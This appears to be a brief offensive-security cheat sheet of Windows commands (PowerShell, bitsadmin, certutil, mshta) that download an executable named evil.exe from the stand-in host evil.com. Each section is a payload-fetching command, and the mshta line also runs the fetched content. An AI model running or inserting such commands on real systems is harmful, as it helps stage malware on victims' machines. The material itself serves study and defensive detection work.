# Downloading Files

Downloading files from external hosts is one of the most common things attackers do. There are several ways to do that.

## PowerShell CmdLets

```powershell
# Method 1
(New-Object System.Net.WebClient).DownloadFile("https://evil.com/evil.exe", "C:\evil.exe")

# Method 2
iwr -uri https://evil.com/evil.exe -outfile .\evil.exe

# Method 3
Start-BitsTransfer -Priority foreground -Source https://evil.com/evil.exe -Destination .\evil.exe
```

## Bitsadmin

```powershell
bitsadmin /transfer /download /priority foreground https://evil.com/evil.exe C:\evil.exe
```

## Certutil

```powershell
certutil -urlcache -split -f https://evil.com/evil.exe .\evil.exe
```

## Mshta

```powershell
mshta https://evil.com/evil.exe
```